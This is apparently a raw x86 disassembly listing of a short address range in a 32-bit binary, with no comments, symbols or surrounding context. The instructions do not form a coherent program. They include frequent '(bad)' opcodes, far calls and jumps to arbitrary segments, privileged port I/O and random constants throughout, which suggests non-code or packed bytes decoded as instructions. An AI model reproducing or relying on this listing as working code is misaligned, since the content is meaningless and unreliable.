  40b5f2:	or     DWORD PTR [ecx-0x50],0xb790e9ff
  40b5f9:	push   edi
  40b5fa:	lds    edi,FWORD PTR [eax+0x62]
  40b5fd:	add    al,dh
  40b5ff:	test   BYTE PTR [eax+0x6665d71c],ch
  40b605:	outs   dx,DWORD PTR ds:[esi]
  40b606:	xchg   esi,eax
  40b607:	or     eax,0x164e7463
  40b60c:	test   BYTE PTR [eax+0xc443342],0xbf
  40b613:	aam    0x2f
  40b615:	inc    edi
  40b616:	pop    ebx
  40b617:	aad    0x5e
  40b619:	loopne 0x40b5d1
  40b61b:	and    eax,0x21292add
  40b620:	lods   al,BYTE PTR ds:[esi]
  40b621:	lods   eax,DWORD PTR ds:[esi]
  40b622:	push   es
  40b623:	fiadd  DWORD PTR [ebx+0x76ff6b4c]
  40b629:	and    ah,BYTE PTR [edi-0x79891d64]
  40b62f:	sbb    al,0x43
  40b631:	mov    dl,0x19
  40b633:	jnp    0x40b653
  40b635:	push   esp
  40b636:	push   esi
  40b637:	push   ecx
  40b638:	jg     0x40b657
  40b63a:	ja     0x40b5df
  40b63c:	mov    eax,ds:0x880d97e4
  40b641:	jno    0x40b6c1
  40b643:	loop   0x40b651
  40b645:	mov    dl,0xe7
  40b647:	and    al,0xbd
  40b649:	loop   0x40b617
  40b64b:	sbb    eax,0x429009da
  40b650:	sbb    bl,BYTE PTR [edx-0x4c]
  40b653:	jae    0x40b5fd
  40b655:	mov    ecx,0x708223e7
  40b65a:	mov    eax,0x44228e5
  40b65f:	mov    dh,0x11
  40b661:	loope  0x40b6d4
  40b663:	xchg   ecx,eax
  40b664:	sbb    al,0xc3
  40b666:	xlat   BYTE PTR ds:[ebx]
  40b667:	test   BYTE PTR [esi-0x4e7d5379],ch
  40b66d:	retf   0xcccd
  40b670:	xchg   ebp,eax
  40b671:	push   eax
  40b672:	mov    edi,0xf45ed39a
  40b677:	lea    esi,[ebx]
  40b679:	xor    dl,al
  40b67b:	pop    esi
  40b67c:	mov    al,ds:0x335a562
  40b681:	retf   
  40b682:	fucomip st,st(3)
  40b684:	(bad)  
  40b685:	in     al,dx
  40b686:	test   DWORD PTR [edi],edx
  40b688:	inc    eax
  40b689:	ror    BYTE PTR ds:0x697a1551,0x84
  40b690:	cmp    al,0x6
  40b692:	(bad)  ds:0xc2dbfb0f
  40b698:	ins    BYTE PTR es:[edi],dx
  40b699:	gs lahf 
  40b69b:	push   ss
  40b69c:	in     eax,dx
  40b69d:	test   al,0xaa
  40b69f:	sub    eax,eax
  40b6a1:	pop    esi
  40b6a2:	pop    ds
  40b6a3:	jae    0x40b6f2
  40b6a5:	ret    
  40b6a6:	scas   eax,DWORD PTR es:[edi]
  40b6a7:	mov    ds:0x4de8100b,eax
  40b6ac:	jl     0x40b63f
  40b6ae:	aas    
  40b6af:	loop   0x40b64c
  40b6b1:	lock adc eax,0xbbdc85d4
  40b6b7:	ror    BYTE PTR [ebp+ebp*1-0x3788ee70],0xce
  40b6bf:	fadd   DWORD PTR [ebp-0x33555719]
  40b6c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6c6:	jp     0x40b70f
  40b6c8:	inc    ebp
  40b6c9:	xchg   ebp,eax
  40b6ca:	mov    eax,0x5bf0e510
  40b6cf:	clc    
  40b6d0:	or     al,0x15
  40b6d2:	and    eax,0xf6f0158c
  40b6d7:	or     BYTE PTR ds:0x83f1a6f8,ah
  40b6dd:	call   0x71ab:0x834c0c36
  40b6e4:	or     al,BYTE PTR [eax+0x29abc67f]
  40b6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6eb:	inc    edx
  40b6ec:	xchg   edi,eax
  40b6ed:	aas    
  40b6ee:	shr    BYTE PTR [ecx],1
  40b6f0:	adc    BYTE PTR [di-0x3101],dh
  40b6f5:	mov    al,ds:0xa5a9cc99
  40b6fa:	mov    bl,0x35
  40b6fc:	in     al,dx
  40b6fd:	fisubr WORD PTR [edi-0x2f]
  40b700:	ror    BYTE PTR [ebp+edi*4-0x14],0xee
  40b705:	and    ebp,0x3560503d
  40b70b:	sub    ecx,DWORD PTR gs:[edi+0x28]
  40b70f:	gs lock ja 0x40b778
  40b713:	test   ecx,ecx
  40b715:	icebp  
  40b716:	xchg   edx,eax
  40b717:	(bad)  [ebx+ebx*1-0xf]
  40b71b:	add    eax,0x96c4c35
  40b720:	jmp    0x3b5ca63c
  40b725:	pop    eax
  40b726:	sub    edx,DWORD PTR [edx+edi*1+0x49a4b6bb]
  40b72d:	shl    DWORD PTR [eax-0x446bd936],0xe2
  40b734:	out    0xf8,al
  40b736:	sar    BYTE PTR [ebp-0x58],cl
  40b739:	mov    DWORD PTR [ebx],0x5f7341c5
  40b73f:	sub    ah,BYTE PTR [ebx+edi*1]
  40b742:	add    eax,0x48c084a9
  40b747:	jb     0x40b74f
  40b749:	pop    esp
  40b74a:	shl    DWORD PTR [edi+0x76ab2926],0xe2
  40b751:	sub    ebx,ecx
  40b753:	jae    0x40b7a2
  40b755:	retf   
  40b756:	xchg   BYTE PTR [edx-0x129a78e7],cl
  40b75c:	scas   eax,DWORD PTR es:[edi]
  40b75d:	imul   edx,DWORD PTR [ecx-0x45658fcd],0xd3926612
  40b767:	std    
  40b768:	pop    esp
  40b769:	xor    DWORD PTR [edx+ebp*8-0x63b143b7],esp
  40b770:	popa   
  40b771:	ins    BYTE PTR es:[edi],dx
  40b772:	rcr    edi,1
  40b774:	je     0x40b750
  40b776:	(bad)  
  40b777:	mov    ah,0xd8
  40b77a:	or     al,0xfc
  40b77c:	jp     0x40b760
  40b77e:	ret    0x6236
  40b781:	daa    
  40b782:	mov    DWORD PTR [esi+0x3ad2a3bd],ebx
  40b788:	dec    ebp
  40b789:	add    DWORD PTR ds:[ecx+0x70],ebx
  40b78d:	cmc    
  40b78e:	mov    eax,0xd6e62ebe
  40b793:	xor    dl,BYTE PTR [ebp+0x45]
  40b796:	call   0x6e00:0x940186d4
  40b79d:	xchg   DWORD PTR [esi-0x4e],edx
  40b7a0:	and    edx,esp
  40b7a2:	xchg   ebx,eax
  40b7a3:	outs   dx,DWORD PTR ds:[esi]
  40b7a4:	mov    eax,0x1e951467
  40b7a9:	fisttp QWORD PTR [ecx]
  40b7ab:	mov    eax,0xac81a19f
  40b7b0:	push   ebx
  40b7b1:	cli    
  40b7b2:	mov    edx,0x400dc0e1
  40b7b7:	rol    ebx,1
  40b7b9:	nop
  40b7ba:	into   
  40b7bb:	mov    esp,0xc00cca70
  40b7c0:	and    ch,BYTE PTR [edx+0x66]
  40b7c3:	scas   eax,DWORD PTR es:[edi]
  40b7c4:	pop    esp
  40b7c5:	fs inc ebx
  40b7c7:	imul   eax,ecx,0x2f
  40b7ca:	icebp  
  40b7cb:	mov    dh,0x1c
  40b7cd:	fcomp  QWORD PTR [eax+0x6fffbc0d]
  40b7d3:	enter  0x6197,0x9d
  40b7d7:	jnp    0x40b846
  40b7d9:	in     al,0xa
  40b7db:	xor    ebp,DWORD PTR [edi-0x4e3314ad]
  40b7e1:	leave  
  40b7e2:	mov    edx,0x8f9043a4
  40b7e7:	cwde   
  40b7e8:	call   0xafb:0xbb6edf84
  40b7ef:	mov    WORD PTR [ebx],cs
  40b7f1:	mov    ds:0xae3d9b99,al
  40b7f6:	loop   0x40b7fc
  40b7f8:	fdiv   QWORD PTR [ebx-0x6294a63e]
  40b7fe:	js     0x40b797
  40b800:	test   eax,0x1cb6572b
  40b805:	adc    DWORD PTR [eax+0x63f2a22],ebx
  40b80b:	aam    0xaa
  40b80d:	stc    
  40b80e:	out    0x9,al
  40b810:	mov    ?,WORD PTR ds:0xb44167f3
  40b816:	mov    ecx,0xc7acf92a
  40b81b:	test   eax,0x6822f588
  40b820:	cli    
  40b821:	or     BYTE PTR [ebx],ch
  40b823:	cwde   
  40b824:	lods   al,BYTE PTR ds:[esi]
  40b825:	cwde   
  40b826:	adc    BYTE PTR [ecx+eax*1+0x285b2704],al
  40b82d:	pushf  
  40b82e:	push   ecx
  40b82f:	xchg   ebx,eax
  40b830:	pop    eax
  40b831:	and    al,0xa
  40b833:	fisub  DWORD PTR [ecx]
  40b835:	dec    esp
  40b836:	les    ebx,FWORD PTR es:[eax]
  40b839:	mov    ds:0xbbaf80c0,al
  40b83e:	lock sub eax,0x9b665305
  40b844:	in     al,dx
  40b845:	jb     0x40b8a0
  40b847:	xor    dl,BYTE PTR [eax]
  40b849:	cmp    BYTE PTR [esi],ch
  40b84b:	nop
  40b84c:	dec    eax
  40b84d:	push   esi
  40b84e:	mov    gs,WORD PTR ds:0xefcac2c2
  40b854:	ret    0x4674
  40b857:	stc    
  40b858:	and    bl,BYTE PTR [ebx+0x14]
  40b85b:	shr    BYTE PTR [edx+0x46],1
  40b85e:	sti    
  40b85f:	nop
  40b860:	dec    edx
  40b861:	mov    cl,0x3f
  40b863:	dec    edi
  40b864:	mov    cl,0x80
  40b866:	mov    dh,0x5
  40b868:	jmp    0x40b841
  40b86a:	dec    eax
  40b86b:	fmul   st,st(2)
  40b86d:	adc    DWORD PTR [eax-0x4e],ebx
  40b870:	data16 and BYTE PTR [esi+0xa],al
  40b874:	dec    ecx
  40b875:	mov    ebp,0xa01bb82d
  40b87a:	sbb    al,0xe1
  40b87c:	scas   al,BYTE PTR es:[edi]
  40b87d:	leave  
  40b87e:	jp     0x40b8b5
  40b880:	xchg   edi,eax
  40b881:	dec    esp
  40b882:	clc    
  40b883:	sub    eax,0x2c3abbba
  40b888:	popa   
  40b889:	xchg   edi,eax
  40b88a:	mov    ds:0xb208bc38,eax
  40b88f:	call   0x354be50c
  40b894:	mov    al,BYTE PTR [ebp+0x7d]
  40b897:	or     esi,DWORD PTR [ecx]
  40b899:	and    eax,0x57e38b00
  40b89e:	and    eax,0xa91b7e7b
  40b8a3:	ror    BYTE PTR [eax+0x51e953e7],0x54
  40b8aa:	xchg   ecx,eax
  40b8ab:	jg     0x40b8e0
  40b8ad:	jo     0x40b8f6
  40b8af:	ins    DWORD PTR es:[edi],dx
  40b8b0:	push   ds
  40b8b1:	ja     0x40b84a
  40b8b3:	push   ecx
  40b8b4:	mov    eax,DWORD PTR [ecx]
  40b8b6:	mov    edx,0xb50c1df9
  40b8bb:	and    bl,BYTE PTR [eax+eax*1-0x3889cc5e]
  40b8c2:	loopne 0x40b8ed
  40b8c4:	add    dh,BYTE PTR [eax-0x57]
  40b8c7:	jnp    0x40b8c9
  40b8c9:	xor    bl,BYTE PTR [edi]
  40b8cb:	ret    
  40b8cc:	cmovl  ebp,DWORD PTR [edx+eiz*2+0x73dfc9fc]
  40b8d4:	mov    bl,0xd5
  40b8d6:	mov    cl,0x74
  40b8d8:	daa    
  40b8d9:	xchg   ebp,eax
  40b8da:	or     al,0x8e
  40b8dc:	dec    esi
  40b8dd:	in     al,dx
  40b8de:	ja     0x40b948
  40b8e0:	into   
  40b8e1:	sub    eax,0x83b112a5
  40b8e6:	out    dx,eax
  40b8e7:	cs scas eax,DWORD PTR es:[edi]
  40b8e9:	or     BYTE PTR [esi],dl
  40b8eb:	xchg   DWORD PTR [edx],ebp
  40b8ed:	stos   DWORD PTR es:[edi],eax
  40b8ee:	push   0x655a093e
  40b8f3:	ins    DWORD PTR es:[edi],dx
  40b8f4:	add    ebx,DWORD PTR [edi+0x1b]
  40b8f7:	dec    eax
  40b8f8:	sbb    eax,0x73b50fd2
  40b8fd:	fld    QWORD PTR [edi]
  40b8ff:	mov    ds:0xb638de36,al
  40b904:	je     0x40b908
  40b906:	sbb    dl,BYTE PTR [ebx+0x2]
  40b909:	mov    eax,ds:0x40618810
  40b90e:	ret    0x4533
  40b911:	loopne 0x40b932
  40b913:	fcom   QWORD PTR [ecx-0x3828b59e]
  40b919:	arpl   WORD PTR [eax],di
  40b91b:	xor    edi,ebp
  40b91d:	(bad)  
  40b91f:	push   ecx
  40b920:	fsubr  st,st(7)
  40b922:	pop    eax
  40b923:	and    al,0xde
  40b925:	aam    0x6b
  40b927:	lahf   
  40b928:	imul   edi,DWORD PTR [edi],0x16049b9e
  40b92e:	rol    DWORD PTR [ebx+0x7724195f],cl
  40b934:	or     BYTE PTR [ecx+0x6e5f6411],dl
  40b93a:	outs   dx,DWORD PTR ds:[esi]
  40b93b:	xchg   ebp,eax
  40b93c:	adc    eax,0x1365394a
  40b941:	adc    DWORD PTR [ecx+ebx*8+0x3e963be4],0x7ee1162c
  40b94c:	sahf   
  40b94d:	add    ch,BYTE PTR [edi+0x29]
  40b950:	xor    dh,BYTE PTR [ebp+edx*8-0x11]
  40b954:	xchg   BYTE PTR cs:[ebp+0x3],bh
  40b958:	and    BYTE PTR [ebp+esi*2-0x18],0xcf
  40b95d:	rol    BYTE PTR [ecx],1
  40b95f:	xchg   ebp,eax
  40b960:	pop    ebx
  40b961:	js     0x40b992
  40b963:	adc    ah,BYTE PTR [eax-0x6723712a]
  40b969:	dec    ecx
  40b96a:	jb     0x40b98f
  40b96c:	mov    DWORD PTR [eax+0x14],eax
  40b96f:	es das 
  40b971:	mov    gs,WORD PTR [ecx+0x4e]
  40b974:	scas   al,BYTE PTR es:[edi]
  40b975:	sub    al,0xbc
  40b977:	dec    eax
  40b978:	je     0x40b938
  40b97a:	xchg   esi,eax
  40b97b:	mov    al,ds:0x9441e283
  40b980:	stc    
  40b981:	sbb    eax,0x2d846ba4
  40b986:	sbb    eax,0xd7904837
  40b98b:	addr16 loopne 0x40b9ef
  40b98e:	out    0x74,eax
  40b990:	cli    
  40b991:	loopne 0x40b978
  40b993:	in     eax,dx
  40b994:	jge    0x40b967
  40b996:	sub    al,0x1
  40b998:	sahf   
  40b999:	out    dx,al
  40b99a:	and    eax,0x1b25fd7
  40b99f:	xor    esp,DWORD PTR [eax]
  40b9a1:	lea    ebx,ss:[ebx]
  40b9a4:	and    esi,DWORD PTR [ecx+0x122de4a0]
  40b9aa:	sar    BYTE PTR [edi+0x27a883ef],cl
  40b9b0:	pop    ds
  40b9b1:	mov    ?,WORD PTR [ebp-0x410ebfd7]
  40b9b7:	sub    eax,0xdfeca594
  40b9bc:	leave  
  40b9bd:	cmc    
  40b9be:	inc    edx
  40b9bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9c0:	stc    
  40b9c1:	xchg   BYTE PTR [ecx-0x1c],cl
  40b9c4:	gs in  al,dx
  40b9c6:	aad    0x47
  40b9c8:	pop    ecx
  40b9c9:	rcl    DWORD PTR [ebx-0x43],cl
  40b9cc:	dec    edi
  40b9cd:	in     al,dx
  40b9ce:	cmp    esp,DWORD PTR [edi]
  40b9d0:	mov    edi,0xe4901517
  40b9d5:	xor    eax,0x8cf1929d
  40b9da:	adc    BYTE PTR [esi],ch
  40b9dc:	in     al,dx
  40b9dd:	mov    bl,0x93
  40b9df:	adc    BYTE PTR [esi-0x45],cl
  40b9e2:	jnp    0x40b9ad
  40b9e4:	fwait
  40b9e5:	cld    
  40b9e6:	adc    ebx,DWORD PTR [ebp+0x29]
  40b9e9:	pop    esi
  40b9ea:	xlat   BYTE PTR ds:[ebx]
  40b9eb:	dec    esi
  40b9ec:	or     edx,DWORD PTR [edx]
  40b9ee:	dec    edx
  40b9ef:	mov    esi,0x173f540d
  40b9f4:	mov    ebx,0x6a373c57
  40b9f9:	cmp    BYTE PTR [edx+0x1e],dh
  40b9fc:	jle    0x40b9b8
  40b9fe:	mov    esp,0xa3c7a92e
  40ba03:	imul   ebx,DWORD PTR [edi],0x5f
  40ba06:	push   ecx
  40ba07:	jnp    0x40b9de
  40ba09:	icebp  
  40ba0a:	repnz push ss
  40ba0c:	dec    edi
  40ba0e:	lods   al,BYTE PTR ds:[esi]
  40ba0f:	daa    
  40ba10:	jbe    0x40b9c1
  40ba12:	xchg   ebx,eax
  40ba13:	ret    
  40ba14:	cli    
  40ba15:	call   0xc136:0x4c4e33d1
  40ba1c:	inc    edx
  40ba1d:	les    ebp,FWORD PTR [eax+0x2ef4c3bf]
  40ba23:	xor    eax,0xfceee94d
  40ba28:	cld    
  40ba29:	popa   
  40ba2a:	iret   
  40ba2b:	jnp    0x40ba15
  40ba2d:	add    DWORD PTR [ebp-0x7ff9330b],ebx
  40ba33:	push   es
  40ba34:	test   DWORD PTR [ecx-0x647cf05a],edi
  40ba3a:	fistp  WORD PTR [ebx]
  40ba3c:	clc    
  40ba3d:	pop    edx
  40ba3e:	sub    eax,0xcaf2b306
  40ba43:	ins    DWORD PTR es:[edi],dx
  40ba44:	fwait
  40ba45:	mov    ah,0x23
  40ba47:	cmp    BYTE PTR [edx],ch
  40ba49:	mov    cl,0x19
  40ba4b:	xor    bh,BYTE PTR [edx]
  40ba4d:	or     al,0x82
  40ba4f:	out    0x7b,al
  40ba51:	push   cs
  40ba52:	or     DWORD PTR [edx-0x55eacdf6],ebx
  40ba58:	test   ebx,0x910f5a01
  40ba5e:	call   0xc78a:0xc365cba3
  40ba65:	and    DWORD PTR [edi+ebp*4],ebp
  40ba68:	les    esi,FWORD PTR [ecx+0x231ba5c]
  40ba6e:	pushf  
  40ba6f:	mov    eax,0x6beafc3d
  40ba74:	ja     0x40bad2
  40ba76:	sbb    DWORD PTR [ecx],0xffffffe6
  40ba79:	jo     0x40ba9c
  40ba7b:	(bad)  
  40ba7c:	mov    dl,0x8c
  40ba7e:	jmp    0xe95fa3e8
  40ba83:	pop    ds
  40ba84:	xor    eax,0xbc60077f
  40ba89:	clc    
  40ba8a:	paddsb mm4,QWORD PTR [ecx-0x6186e763]
  40ba91:	ins    BYTE PTR es:[edi],dx
  40ba92:	jbe    0x40ba6b
  40ba94:	(bad)  
  40ba95:	push   ds
  40ba96:	mov    BYTE PTR [ecx+esi*8],bl
  40ba99:	imul   ecx,ebp,0x21d9e906
  40ba9f:	js     0x40ba8e
  40baa1:	les    ebp,FWORD PTR [esi-0x66]
  40baa4:	fisub  WORD PTR [ecx-0x27306a30]
  40baaa:	enter  0x81d5,0x6a
  40baae:	xchg   ebp,ebx
  40bab0:	ret    0xca35
  40bab3:	cli    
  40bab4:	bound  eax,QWORD PTR ds:0xbf9a7089
  40baba:	leave  
  40babb:	push   ds
  40babc:	inc    ebx
  40babd:	dec    edx
  40babe:	cdq    
  40babf:	xchg   ecx,eax
  40bac0:	js     0x40ba70
  40bac2:	dec    esi
  40bac3:	je     0x40baf0
  40bac5:	dec    eax
  40bac6:	inc    edx
  40bac7:	add    BYTE PTR [edi],0x6c
  40baca:	cmc    
  40bacb:	inc    eax
  40bacc:	daa    
  40bacd:	imul   ebp,esp,0x543bbd93
  40bad3:	out    dx,eax
  40bad4:	dec    ebp
  40bad5:	jo     0x40baec
  40bad7:	addr16 adc al,0xbf
  40bada:	mov    al,0xcc
  40badc:	mov    ebx,0x5e7d7dc3
  40bae1:	stc    
  40bae2:	fmul   st(0),st
  40bae4:	or     esp,DWORD PTR [ebp-0x7d]
  40bae7:	loop   0x40bb40
  40bae9:	pop    edi
  40baea:	xchg   ecx,eax
  40baeb:	pop    ecx
  40baec:	repnz ss pop ebx
  40baef:	mov    ds:0x6eaf8efe,al
  40baf4:	and    esp,0x38328974
  40bafa:	xchg   esi,eax
  40bafb:	or     bh,BYTE PTR [ebx-0x5e3ffc0c]
  40bb01:	xchg   ebp,eax
  40bb02:	call   0x1798:0x55144b8b
  40bb09:	add    BYTE PTR [ebx+0x34],al
  40bb0c:	inc    esi
  40bb0d:	loope  0x40bb56
  40bb0f:	cs pop es
  40bb11:	mov    eax,ds:0x62d96c0d
  40bb16:	xor    al,0xc
  40bb18:	mov    al,ds:0xe42437d7
  40bb1d:	fadd   DWORD PTR ds:[edx+0x16]
  40bb21:	inc    eax
  40bb22:	inc    edi
  40bb23:	push   edi
  40bb24:	frstor ds:0x12e0d214
  40bb2a:	popf   
  40bb2b:	das    
  40bb2c:	pop    edi
  40bb2d:	out    dx,al
  40bb2e:	neg    BYTE PTR [edx+0x1c066a5e]
  40bb34:	sub    edx,0xfb36e6cc
  40bb3a:	xchg   esi,eax
  40bb3b:	inc    edx
  40bb3c:	pop    ebx
  40bb3d:	test   BYTE PTR cs:[ebx+0x63861ab8],bl
  40bb44:	jbe    0x40bb3d
  40bb46:	xor    dh,BYTE PTR [ebp-0x1f6017c9]
  40bb4c:	data16 adc ax,0x968d
  40bb51:	cmp    bh,bl
  40bb53:	and    edx,DWORD PTR [esi+0x47451314]
  40bb59:	es cmp ebp,ebx
  40bb5c:	sbb    eax,0xc7074d45
  40bb61:	and    DWORD PTR [eax+0x73aca4df],0xc3e83393
  40bb6b:	inc    edx
  40bb6c:	or     eax,0xeba2dc19
  40bb71:	fcmovu st,st(5)
  40bb73:	and    eax,DWORD PTR [edx+0x6d]
  40bb76:	pop    edi
  40bb77:	jp     0x40bb99
  40bb79:	movntps XMMWORD PTR [ebx+0x36b3ac50],xmm7
  40bb80:	xor    DWORD PTR [edi],esi
  40bb82:	test   BYTE PTR [eax],al
  40bb84:	pop    ss
  40bb85:	dec    esi
  40bb86:	test   eax,0x3fec580a
  40bb8b:	retf   
  40bb8c:	leave  
  40bb8d:	jge    0x40bc01
  40bb8f:	or     DWORD PTR [eax-0x61],0xa6f40884
  40bb96:	sbb    BYTE PTR [eax-0x73],ch
  40bb99:	sub    al,0xd7
  40bb9c:	sbb    BYTE PTR [ebx],ch
  40bb9e:	cmp    edx,ebx
  40bba0:	(bad)  
  40bba1:	xchg   ebp,eax
  40bba2:	(bad)  
  40bba3:	shr    BYTE PTR [esi-0x64113461],1
  40bba9:	pop    ds
  40bbaa:	fist   WORD PTR [ebx]
  40bbac:	push   eax
  40bbad:	fwait
  40bbae:	lods   al,BYTE PTR ds:[esi]
  40bbaf:	mov    edx,DWORD PTR [ebx]
  40bbb1:	jmp    0x39e7:0xc8d29ef0
  40bbb8:	sbb    bl,BYTE PTR [eax]
  40bbba:	loopne 0x40bb99
  40bbbc:	in     eax,dx
  40bbbd:	mov    DWORD PTR [edx+0x56],eax
  40bbc0:	xchg   ch,bh
  40bbc2:	xor    eax,DWORD PTR [edi+0x6e]
  40bbc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc6:	add    esp,edi
  40bbc8:	jno    0x40bb59
  40bbca:	sub    edi,DWORD PTR [edx-0x7ece1cbc]
  40bbd0:	(bad)  
  40bbd1:	mov    al,0x12
  40bbd3:	(bad)  [eax-0x61]
  40bbd6:	adc    al,0x6a
  40bbd8:	mov    ah,0x88
  40bbda:	pop    esp
  40bbdb:	mov    DWORD PTR [ebx],edx
  40bbdd:	ins    DWORD PTR es:[edi],dx
  40bbde:	hlt    
  40bbdf:	lods   al,BYTE PTR ds:[esi]
  40bbe0:	xor    DWORD PTR [ecx-0x5a08fae4],ecx
  40bbe6:	cli    
  40bbe7:	jg     0x40bc35
  40bbe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbea:	cld    
  40bbeb:	aad    0xb5
  40bbed:	ret    
  40bbee:	out    0xfd,eax
  40bbf0:	adc    BYTE PTR [ecx+edx*2],bh
  40bbf3:	std    
  40bbf4:	cmp    eax,DWORD PTR [eax+ebx*2-0x23fe90c1]
  40bbfb:	and    edi,ecx
  40bbfd:	aaa    
  40bbfe:	pusha  
  40bbff:	retf   0x84fa
  40bc02:	dec    DWORD PTR [edi]
  40bc04:	add    al,0xba
  40bc06:	push   esp
  40bc07:	hlt    
  40bc08:	inc    esi
  40bc09:	sub    al,0xc1
  40bc0b:	retf   0x31b7
  40bc0e:	mov    dl,0x6b
  40bc10:	ins    DWORD PTR es:[edi],dx
  40bc11:	leave  
  40bc12:	repnz xor al,0x5d
  40bc15:	mov    al,ds:0xf45e40ba
  40bc1a:	ds dec ebx
  40bc1c:	jg     0x40bc8a
  40bc1e:	jge    0x40bc45
  40bc20:	je     0x40bc7d
  40bc22:	arpl   WORD PTR [ecx],ax
  40bc24:	mov    edi,?
  40bc26:	jne    0x40bc72
  40bc28:	gs pop ecx
  40bc2a:	jb     0x40bc55
  40bc2c:	inc    ecx
  40bc2d:	or     eax,0xfc04d2e7
  40bc32:	and    eax,0x49d7755f
  40bc37:	icebp  
  40bc38:	mov    BYTE PTR [edi],cl
  40bc3a:	pop    es
  40bc3b:	test   al,0x84
  40bc3d:	call   0x6352fa6
  40bc42:	dec    edx
  40bc43:	pop    es
  40bc44:	pusha  
  40bc45:	aad    0x9
  40bc47:	sbb    eax,0x8edfe998
  40bc4c:	jg     0x40bbe8
  40bc4e:	dec    ebp
  40bc4f:	xor    BYTE PTR [esp+ecx*4-0x4928f713],cl
  40bc56:	and    edi,edx
  40bc58:	(bad)  [edx-0x47dd6bc1]
  40bc5e:	pushf  
  40bc5f:	mov    ecx,0x4bc31ba2
  40bc64:	add    BYTE PTR cs:[edx+0x71],al
  40bc68:	leave  
  40bc69:	loopne 0x40bcd4
  40bc6b:	cli    
  40bc6c:	icebp  
  40bc6d:	xor    ecx,ebx
  40bc6f:	ret    
  40bc70:	psubq  mm3,QWORD PTR [ecx]
  40bc73:	xor    DWORD PTR [ebx+0x1513f632],0x26
  40bc7a:	cmp    eax,0xc23b89d6
  40bc7f:	mov    esi,eax
  40bc81:	pop    edx
  40bc82:	mov    DWORD PTR [ebx],ecx
  40bc84:	xchg   esp,eax
  40bc85:	pavgw  mm5,QWORD PTR [edx-0x2bc876f9]
  40bc8c:	test   al,0xa9
  40bc8e:	jge    0x40bcb9
  40bc90:	adc    al,0xd0
  40bc92:	jns    0x40bc72
  40bc94:	dec    eax
  40bc95:	jmp    0x676e:0x5c850c
  40bc9c:	ins    BYTE PTR es:[edi],dx
  40bc9d:	inc    ebp
  40bc9e:	sub    edi,DWORD PTR [ecx]
  40bca0:	push   ds
  40bca1:	adc    cl,bh
  40bca3:	sub    edx,eax
  40bca5:	jno    0x40bcb2
  40bca7:	jb     0x40bc96
  40bca9:	call   0xc59:0x82702cd1
  40bcb0:	in     eax,dx
  40bcb1:	and    al,0xfa
  40bcb3:	shl    DWORD PTR [ecx],1
  40bcb5:	cmp    al,0x2e
  40bcb7:	cli    
  40bcb8:	xchg   esp,eax
  40bcb9:	mov    WORD PTR [edx+0x21],cs
  40bcbc:	cmp    edx,DWORD PTR [ecx+0x9eeb649]
  40bcc2:	xor    al,0x1a
  40bcc4:	mov    edi,0xfcfe29f6
  40bcc9:	sub    esi,ecx
  40bccb:	sub    eax,0x3fe85990
  40bcd0:	mov    WORD PTR [edx+0x66e0fc04],ds
  40bcd6:	(bad)  
  40bcd7:	mov    dh,0x9c
  40bcd9:	jmp    0x9072:0xe1433a68
  40bce0:	mov    ds:0x52ed3d66,al
  40bce5:	outs   dx,DWORD PTR cs:[esi]
  40bce7:	or     DWORD PTR [ecx-0x3445b8bb],ecx
  40bced:	sahf   
  40bcee:	cmp    DWORD PTR [eax],edx
  40bcf0:	push   cs
  40bcf1:	pop    eax
  40bcf2:	repz fcomp QWORD PTR [ebx]
  40bcf5:	gs mov eax,0x8a27427e
  40bcfb:	fwait
  40bcfc:	mov    cs,edi
  40bcfe:	jb     0x40bcd0
  40bd00:	std    
  40bd01:	adc    ah,BYTE PTR [edx]
  40bd03:	adc    eax,0xbd688b19
  40bd08:	adc    DWORD PTR [esi-0x7d],edx
  40bd0b:	icebp  
  40bd0c:	pop    ss
  40bd0d:	jg     0x40bcc1
  40bd0f:	jo     0x40bcd4
  40bd11:	push   ebp
  40bd12:	cdq    
  40bd13:	mov    ch,0xb8
  40bd15:	and    esi,DWORD PTR [ecx]
  40bd17:	and    eax,0xb8fdaa28
  40bd1c:	(bad)  
  40bd1d:	aam    0x2f
  40bd1f:	adc    BYTE PTR [ecx-0x39],0xd3
  40bd23:	push   0xffffffbf
  40bd25:	(bad)  ds:0x712f30f4
  40bd2b:	dec    ebp
  40bd2c:	mov    dh,BYTE PTR [ecx+0x72]
  40bd2f:	mov    esp,0x59cc210a
  40bd34:	jbe    0x40bd8c
  40bd36:	fimul  WORD PTR [ecx-0x4bd9369]
  40bd3c:	sti    
  40bd3d:	mov    DWORD PTR ds:0xfa0cd28f,esp
  40bd43:	les    edi,FWORD PTR [edx-0x239a068]
  40bd49:	retf   0xea7c
  40bd4c:	xor    ch,BYTE PTR [edx-0x15652ca9]
  40bd52:	jg     0x40bd10
  40bd54:	add    al,0xf
  40bd56:	or     eax,0xe64b7522
  40bd5b:	in     eax,dx
  40bd5c:	xchg   BYTE PTR [eax-0x15d6d46a],bl
  40bd62:	sub    DWORD PTR [eax],0x33
  40bd65:	in     al,0x16
  40bd67:	dec    cl
  40bd69:	(bad)  
  40bd6a:	cmp    BYTE PTR [edi],bl
  40bd6c:	mov    ecx,0xbef443f3
  40bd71:	(bad)
  40bd74:	jbe    0x40bd12
  40bd76:	test   DWORD PTR [edi+0x4e],ecx
  40bd79:	fwait
  40bd7a:	add    BYTE PTR [esi+0x75944803],0xa1
  40bd81:	loope  0x40bdec
  40bd83:	or     ebp,DWORD PTR [esi]
  40bd85:	sub    al,0x17
  40bd87:	push   esp
  40bd88:	cmp    eax,0xae641ec2
  40bd8d:	scas   eax,DWORD PTR es:[edi]
  40bd8e:	and    DWORD PTR ss:[ecx+0x668f079d],ebp
  40bd95:	idiv   DWORD PTR [ecx+esi*8]
  40bd98:	jbe    0x40bde3
  40bd9a:	call   0x7947:0xeb6beb35
  40bda1:	fnsave [ecx-0x5afd6310]
  40bda7:	mov    BYTE PTR [ebx-0x380a469],al
  40bdad:	jle    0x40bd5c
  40bdaf:	mov    bl,BYTE PTR [ebp+0x60e59e66]
  40bdb5:	retf   
  40bdb6:	(bad)  [edx]
  40bdb8:	imul   DWORD PTR [ecx]
  40bdba:	shr    BYTE PTR [edx+0x7b],0x70
  40bdbe:	jmp    0xdbf395cf
  40bdc3:	and    al,0xa5
